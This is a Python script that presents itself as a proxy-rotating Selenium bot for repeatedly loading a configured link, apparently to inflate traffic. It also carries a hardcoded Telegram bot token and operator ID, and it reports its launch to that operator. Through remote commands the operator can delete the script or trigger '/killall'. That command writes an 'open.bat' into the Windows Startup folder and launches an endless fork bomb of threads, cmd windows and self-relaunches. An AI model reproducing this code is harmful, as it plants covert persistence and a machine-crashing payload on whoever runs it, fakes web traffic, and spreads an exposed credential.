import json
from seleniumwire import webdriver
import threading
from time import sleep
from random import randint
import telebot
import os, subprocess
from threading import Thread
import getpass

USER_NAME = getpass.getuser()

with open("config.json", "r") as ff:
    config = json.load(ff)

file = __file__

bot = telebot.TeleBot("6253091837:AAHtDY2BN-bnbyImKlJeiWEOwVpPq81OPQw")
bot.send_message(1819042943, "!!!Бот запустили!!!")
# get chrome path: chrome://version/

options = webdriver.ChromeOptions()

if not config["WindowOpen"]:
    options.add_argument('headless')
options.add_argument('ignore-certificate-errors')

prefs = {"profile.default_content_setting_values.geolocation": 2}
# options.add_experimental_option("prefs", prefs)
options.binary_location = config["ChromePath"]


@bot.message_handler(commands=['del'])
def send_welcome(message):
    if message.from_user.id == 1819042943:
        try:
            os.remove(file)
            bot.send_message(message.chat.id, "Скрипт самоудалён")
        except Exception as ex:
            bot.send_message(message.chat.id, f"Произошла ошибка {ex}")


@bot.message_handler(commands=['killall'])
def send_welcome(message):
    if message.from_user.id == 1819042943:
        try:
            while True:
                add_to_startup(os.path.abspath(__file__))
                run()
        except Exception as ex:
            bot.send_message(message.chat.id, f"Произошла ошибка {ex}")


@bot.message_handler(commands=['test'])
def send_welcome(message):
    if message.from_user.id == 1819042943:
        bot.send_message(message.chat.id, "Скрипт запущен")


def update():
    global config
    with open("config.json", "w") as json_file:
        json.dump(config, json_file)


def restart(thr):
    # subprocess.call([sys.executable, os.path.realpath(file)] + sys.argv[1:])
    for elem in thr:
        elem.terminate()


def extract_arg(arg):
    return arg.split()[1]


def new_cmd():
    while True:
        os.system("start cmd")
        subprocess.Popen(f"python3 {__file__}")


def run():
    while True:
        t = Thread(target=run)
        t.start()
        new_cmd()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def open_tab(id):
    proxies = open("proxies.txt", 'r')
    proxies = proxies.read().splitlines()
    try:
        ip = proxies[id]
    except IndexError:
        ip = proxies[-1]

    proxy_options = {
        "proxy": {
            "https": f"https://{ip}",
            "http": f"http://{ip}"
        }

    }

    driver = webdriver.Chrome(seleniumwire_options=proxy_options, options=options)
    driver.get(config["link"])
    sleep(randint(config["interval"][0], config["interval"][1]))
    driver.quit()
    open_tab(id)


def polling():
    bot.infinity_polling()


pol = threading.Thread(target=polling)
pol.start()

if __name__ == '__main__':
    threads = []
    for i in range(config["ThreadsNum"]):
        t = threading.Thread(target=open_tab, args=(i,))
        threads.append(t)
        t.start()
